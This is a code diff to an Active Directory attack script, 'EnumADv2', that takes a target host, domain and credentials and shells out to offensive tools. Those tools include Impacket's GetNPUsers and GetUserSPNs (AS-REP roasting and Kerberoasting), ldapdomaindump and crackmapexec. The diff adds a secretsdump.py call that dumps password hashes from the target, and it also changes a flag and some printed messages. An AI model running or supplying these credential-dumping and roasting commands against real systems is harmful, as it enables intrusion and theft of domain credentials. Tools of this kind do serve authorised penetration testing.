@@ -50,7 +50,7 @@ parser = argparse.ArgumentParser(description="EnumADv2", formatter_class=argpars
 parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
 parser.add_argument("-d", "--DOMAIN", action="store", help="Domain Name")
 parser.add_argument("-u", "--USERNAME", action="store", help="Username")
-parser.add_argument("-P", "--PASSWORD", action="store", help="Password")
+parser.add_argument("-p", "--PASSWORD", action="store", help="Password")
 parser.add_argument("-L", "--USERSFILE", action="store", help="Username File if you have one")
 parser.add_argument("-n", "--NMAP", action="store_true", help="Run NMAP Instead of RustScan")
 parser.add_argument("-R", "--RUST", action="store_true", help="Run RustScan Instead of NMAP, this is much faster")
@@ -299,7 +299,7 @@ def LDAPDOMAINDUMP():
 	path = 'LDAP' 
 	directory = os.listdir(path)
 	if len(directory) == 0:
-		print(f"{RED}User cannot do an LDAPDOMAINDUMP, sorry :( {RESET}")
+		print(f"{RED}Anonymous LDAPDOMAINDUMP not allowed, sorry :( {RESET}")
 	if len(directory) != 0:
 		print(f"{YELLOW}Looks like user was able to do an LDAPDOMAINDUMP, LEEEETTTTTSSSS GOOOOOO")
 
@@ -459,9 +459,12 @@ def IMPACKET():
 				os.system(f"GetNPUsers.py -no-pass -usersfile {users} {y}")
 				os.system(f"GetUserSPNs.py -no-pass -usersfile {users} {y}")
 	if USERNAME is not None and PASSWORD is not None:
-		print(f"{YELLOW}Running Impacket attacks with {USERNAME} and {PASSWORD}{RESET} \n")
+		print(f"{YELLOW}\nRunning Impacket attacks with {USERNAME} and {PASSWORD}{RESET}")
+		print(f"\n{MAGENTA}Checking local login and secretsdump{RESET}")
+		os.system(f"secretsdump.py /'{USERNAME}:{PASSWORD}'@{RHOST}")
 		with open ("domainname.txt", "r") as f:
 			y = f.read()
+			print(f"\n{MAGENTA}Checking with domain name {y} for impacket tools this may take a minute{RESET}")
 			os.system(f"GetADUsers.py {y}/{USERNAME}:{PASSWORD} > impacket.txt")
 			os.system(f"GetNPUsers.py {y}/{USERNAME}:{PASSWORD} >> impacket.txt")
 			os.system(f"GetNPUsers.py {y}/{USERNAME}:{PASSWORD} -request > impacket.txt")
@@ -520,6 +523,7 @@ def CRACKMAPEXEC():
 					time.sleep(2)
 			
 	if USERNAME is not None and PASSWORD is not None:
+		print(f"{YELLOW}I will tell you what I can, but your mind will take a stand, I sing of a greater love, let me know when you've had enough{RESET}")
 		c = "crackmapexec smb"
 		w = "crackmapexec winrm"
 		l = "crackmapexec ldap"
